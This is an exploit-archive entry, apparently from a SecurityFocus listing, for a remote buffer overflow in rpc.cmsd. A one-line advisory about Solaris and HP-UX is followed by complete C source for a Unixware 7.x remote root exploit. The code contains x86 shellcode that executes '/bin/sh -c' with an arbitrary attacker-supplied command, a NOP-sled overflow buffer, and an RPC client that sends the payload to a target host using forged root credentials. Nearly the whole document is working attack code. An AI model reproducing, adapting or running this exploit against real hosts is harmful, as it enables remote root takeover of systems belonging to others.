source: http://www.securityfocus.com/bid/524/info
 
There is a remotely exploitable buffer overflow vulnerability in rpc.cmsd which ships with Sun's Solaris and HP-UX versions 10.20, 10.30 and 11.0 operating systems. The consequence is a remote root compromise. 

/*
 * Unixware 7.x rpc.cmsd exploit by jGgM
 * http://www.netemperor.com/en/
 * EMail: jggm@mail.com
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rpc/rpc.h>

#define CMSD_PROG 100068
#define CMSD_VERS 4
#define CMSD_PROC 21

#define BUFFER_SIZE	1036
#define SHELL_START	1024
#define RET_LENGTH	12
#define ADJUST		100
#define NOP	0x90
#define LEN		68

char shell[] =
  /*  0 */ "\xeb\x3d"                         /* jmp springboard [2000]*/
  /* syscall:                                                    [2000]*/
  /*  2 */ "\x9a\xff\xff\xff\xff\x07\xff"     /* lcall 0x7,0x0   [2000]*/
  /*  9 */ "\xc3"                             /* ret             [2000]*/
  /* start:                                                      [2000]*/
  /* 10 */ "\x5e"                             /* popl %esi       [2000]*/
  /* 11 */ "\x31\xc0"                         /* xor %eax,%eax   [2000]*/
  /* 13 */ "\x89\x46\xbf"                     /* movl %eax,-0x41(%esi) */
  /* 16 */ "\x88\x46\xc4"                     /* movb %al,-0x3c(%esi)  */
  /* 19 */ "\x89\x46\x0c"                     /* movl %eax,0xc(%esi)   */
  /* 22 */ "\x88\x46\x17"                     /* movb %al,0x17(%esi)   */
  /* 25 */ "\x88\x46\x1a"                     /* movb %al,0x1a(%esi)   */
  /* 28 */ "\x88\x46\xff"                     /* movb %al,0x??(%esi)   */
  /* execve:                                                     [2000]*/
  /* 31 */ "\x31\xc0"                         /* xor %eax,%eax   [2000]*/
  /* 33 */ "\x50"                             /* pushl %eax      [2000]*/
  /* 34 */ "\x56"                             /* pushl %esi      [2000]*/
  /* 35 */ "\x8d\x5e\x10"                     /* leal 0x10(%esi),%ebx  */
  /* 38 */ "\x89\x1e"                         /* movl %ebx,(%esi)[2000]*/
  /* 40 */ "\x53"                             /* pushl %ebx      [2000]*/
  /* 41 */ "\x8d\x5e\x18"                     /* leal 0x18(%esi),%ebx  */
  /* 44 */ "\x89\x5e\x04"                     /* movl %ebx,0x4(%esi)   */
  /* 47 */ "\x8d\x5e\x1b"                     /* leal 0x1b(%esi),%ebx  */
  /* 50 */ "\x89\x5e\x08"                     /* movl %ebx,0x8(%esi)   */
  /* 53 */ "\xb0\x3b"                         /* movb $0x3b,%al  [2000]*/
  /* 55 */ "\xe8\xc6\xff\xff\xff"             /* call syscall    [2000]*/
  /* 60 */ "\x83\xc4\x0c"                     /* addl $0xc,%esp  [2000]*/
  /* springboard:                                                [2000]*/
  /* 63 */ "\xe8\xc6\xff\xff\xff"             /* call start      [2000]*/
  /* data:                                                       [2000]*/
  /* 68 */ "\xff\xff\xff\xff"                 /* DATA            [2000]*/
  /* 72 */ "\xff\xff\xff\xff"                 /* DATA            [2000]*/
  /* 76 */ "\xff\xff\xff\xff"                 /* DATA            [2000]*/
  /* 80 */ "\xff\xff\xff\xff"                 /* DATA            [2000]*/
  /* 84 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA            [2000]*/
  /* 92 */ "\x2d\x63\xff";                    /* DATA            [2000]*/

struct cm_send {
   char *s1;
   char *s2;
};

struct cm_reply {
   int i;
};

bool_t xdr_cm_send(XDR *xdrs, struct cm_send *objp)
{
   if(!xdr_wrapstring(xdrs, &objp->s1))
      return (FALSE);
   if(!xdr_wrapstring(xdrs, &objp->s2))
       return (FALSE);
   return (TRUE);
}

bool_t xdr_cm_reply(XDR *xdrs, struct cm_reply *objp)
{
   if(!xdr_int(xdrs, &objp->i))
      return (FALSE);
   return (TRUE);
}

long get_ret() {
   return 0x8047720;
}

int
main(int argc, char *argv[])
{
   char buffer[BUFFER_SIZE + 1];
   long ret, offset;
   int len, x, y;
   char *command, *hostname;

   CLIENT *cl;
   struct cm_send send;
   struct cm_reply reply;
   struct timeval tm = { 10, 0 };
   enum clnt_stat stat;

   if(argc < 3 || argc > 4) {
      printf("Usage: %s [hostname] [command] [offset]\n", argv[0]);
      exit(1);
   } // end of if..

   hostname = argv[1];
   command = argv[2];

   if(argc == 4) offset = atol(argv[3]);
   else offset=0;

   len = strlen(command);
   len++;
   len = -len;
   shell[LEN+0] = (len >>  0) & 0xff;
   shell[LEN+1] = (len >>  8) & 0xff;
   shell[LEN+2] = (len >> 16) & 0xff;
   shell[LEN+3] = (len >> 24) & 0xff;

   shell[30] = (char)(strlen(command) + 27);

   ret = get_ret() + offset;

   for(x=0; x<BUFFER_SIZE; x++) buffer[x] = NOP;

   x = BUFFER_SIZE - RET_LENGTH - strlen(shell) - strlen(command) - 1 - ADJUST;

   for(y=0; y<strlen(shell); y++)
      buffer[x++] = shell[y];

   for(y=0; y<strlen(command); y++)
      buffer[x++] = command[y];

   buffer[x] = '\xff';

   x = SHELL_START;
   for(y=0; y<(RET_LENGTH/4); y++, x=x+4)
      *((int *)&buffer[x]) = ret;

   buffer[x] = 0x00;

   printf("host = %s\n", hostname);
   printf("command = '%s'\n", command);
   printf("ret address = 0x%x\n", ret);
   printf("buffer size = %d\n", strlen(buffer));

   send.s1 = buffer;
   send.s2 = "";

   cl = clnt_create(hostname, CMSD_PROG, CMSD_VERS, "udp");
   if(cl == NULL) {
      clnt_pcreateerror("clnt_create");
      printf("exploit failed; unable to contact RPC server\n");
      exit(1);
   }
   cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
   stat = clnt_call(cl, CMSD_PROC, xdr_cm_send, (caddr_t) &send,
                        xdr_cm_reply, (caddr_t) &reply, tm);
   if(stat == RPC_SUCCESS) {
      printf("exploit is failed!!\n");
      clnt_destroy(cl);
      exit(1);
   } else {
      printf("Maybe, exploit is success!!\n");
      clnt_destroy(cl);
      exit(0);
   }
}
